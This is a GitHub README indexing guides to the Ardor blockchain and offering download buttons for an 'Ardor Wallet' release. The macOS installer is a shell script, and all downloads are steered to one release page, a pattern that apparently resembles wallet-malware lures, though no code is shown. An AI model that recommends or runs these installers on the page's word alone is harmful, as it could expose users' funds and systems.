![Ardor Wallet guides](assets/banner-hub.png)

<h1 align="center">Ardor platform guides</h1>

<p align="center">The Ardor platform, its child chains and its built-in features</p>

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-AGPL--3.0-1562a1?style=for-the-badge&labelColor=0c395d" alt="License: AGPL-3.0"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5"><img src="https://img.shields.io/badge/RELEASE-v2.6.5-1562a1?style=for-the-badge&labelColor=0c395d" alt="Release v2.6.5"></a></p>

---

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

This repository explains the platform the Ardor Wallet is a client for: the parent chain and its child chains, the ARDR token, what happened to Nxt, and the features that most wallets leave out, from assets with royalties to on-chain polls, phasing, data storage and coin shuffling. It is the background set, written for readers who want to understand what a button does before pressing it.

It helps token holders who want to know what they own, Nxt users who want to know where their balance went, issuers who want to sell an asset or pay dividends to its holders, and traders who want to use the built-in exchange instead of sending coins to a third party. The guides stay concrete: each one names the screen, the fields and the fee.

The groups run from the general to the specific. The platform and its chains covers the architecture and the child chains, including Ignis and lightweight contracts. Nxt and the migration answers the question the old chain left behind. Assets, trading and marketplace is the commercial set. Governance, phasing and privacy holds the features that make the wallet more than a balance sheet, and Data and proofs closes with storage and timestamps.

Two rules apply across the set. Anything that touches value is described with its fee and its irreversibility, because an Ardor transaction cannot be recalled. And nothing claims a price, a yield or a promise about the future: the platform is described as it behaves today, with the release it ships in.

Every guide links to the wallet download it needs and to the guides either side of it, so a reader who lands on the middle of a topic can move in either direction. The tables below are the full contents of this repository.

## Start here

<div align="center">

| Guide | Why start here |
| --- | --- |
| [What the Ardor blockchain is, how it works, and what else is called Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ardor-blockchain-platform.md) | How the parent chain and child chains work, and what else uses the name. |
| [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) | How Ardor child chains share one passphrase and one parent chain. |
| [What happened to the Nxt chain, and where the token is now](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-happened-to-the-nxt-chain-on-ardor.md) | Where NXT balances went when the standalone chain stopped. |

</div>

## All 15 guides in this repository

### The platform and its chains

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What the Ardor blockchain is, how it works, and what else is called Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ardor-blockchain-platform.md) | How the parent chain and child chains work, and what else uses the name. |
| [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) | How Ardor child chains share one passphrase and one parent chain. |
| [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md) | What Ignis is, how its fees work, and what the wallet does with it. |
| [Ardor lightweight contracts explained](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-lightweight-contracts.md) | How lightweight contracts add logic to Ardor without a separate virtual machine. |

</div>

### Nxt and the migration

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What happened to the Nxt chain, and where the token is now](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-happened-to-the-nxt-chain-on-ardor.md) | Where NXT balances went when the standalone chain stopped. |
| [The Nxt migration to Ardor, step by step for holders](https://github.com/ardor-software/ardor-platform-guides/blob/main/nxt-migration-to-ardor-explained.md) | What Nxt holders had to do, and what the migration did for them. |

</div>

### Assets, trading and marketplace

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Issue an asset or a custom currency on Ardor, and trade it](https://github.com/ardor-software/ardor-platform-guides/blob/main/issue-and-trade-assets-on-ardor.md) | Issue an asset with royalties and trade it on the built-in exchange. |
| [Pay dividends to every asset holder in one action](https://github.com/ardor-software/ardor-platform-guides/blob/main/pay-dividends-to-asset-holders-on-ardor.md) | Pay every asset holder in one transaction instead of one by one. |
| [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md) | Place, fill and cancel orders on the built-in decentralised exchange. |
| [Sell on the Ardor marketplace](https://github.com/ardor-software/ardor-platform-guides/blob/main/sell-on-the-ardor-marketplace.md) | List goods or files for sale with escrow conditions on chain. |

</div>

### Governance, phasing and privacy

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Create a poll and vote in the Ardor wallet](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md) | Run an on-chain poll and a token-gated vote from the wallet. |
| [Phased, atomic and multisig transactions in Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/phased-and-atomic-transactions-in-ardor.md) | Delay a transaction until conditions are met, and chain several together. |
| [Shuffle coins for privacy in Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/shuffle-coins-for-privacy-in-ardor.md) | Mix coins with the shuffler and understand what privacy it gives. |

</div>

### Data and proofs

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Store data on the Ardor data cloud](https://github.com/ardor-software/ardor-platform-guides/blob/main/keep-files-on-the-ardor-data-cloud.md) | Store tagged data on chain and keep it retrievable from archival nodes. |
| [Prove a document existed on a date with Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/prove-a-document-existed-with-ardor.md) | Timestamp a document hash so its existence can be proven later. |

</div>

## More guides

- [ardor-wallet-guides](https://github.com/ardor-software/ardor-wallet-guides) - 23 guides
- [ardor-forging-and-nodes](https://github.com/ardor-software/ardor-forging-and-nodes) - 16 guides
- [The Ardor Wallet GitHub page](https://github.com/ardor-software/ardor-software) - the index of all 54
- [The Ardor desktop wallet](https://github.com/ardor-software/ardor-desktop-wallet) - download and release notes

---

## About

These guides describe the Ardor Wallet desktop application and the platform it connects to. Every installer comes from the release page, and the SHA-256 values published there are the ones to compare before a first run.

## License

AGPL-3.0
